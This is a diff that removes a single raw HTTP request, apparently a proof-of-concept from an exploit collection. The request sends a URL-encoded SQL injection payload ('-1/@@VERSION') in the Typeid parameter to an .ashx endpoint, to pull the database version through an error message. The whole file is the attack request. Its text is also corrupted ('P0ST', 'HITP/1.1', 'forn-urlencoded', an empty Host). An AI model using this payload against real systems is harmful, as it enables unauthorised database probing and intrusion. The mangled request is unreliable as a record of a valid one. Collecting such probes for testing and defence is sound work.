@@ -1,9 +1,0 @@
-P0ST /Ajax/GetDropDowListContent.ashx HITP/1.1
-User-Agent: Mozilla/4.0(compatible:ISIE 8.0:Windows NT 6.1)
-Accept-Encoding: gzip,deflate
-Accept: */*
-Connection: close
-Host:
-Content-Length: 58
-Content-Type: application/x-www-forn-urlencoded
-action=getType&Typeid=%2d%31%2f%40%40%56%45%52%53%49%4f%4e
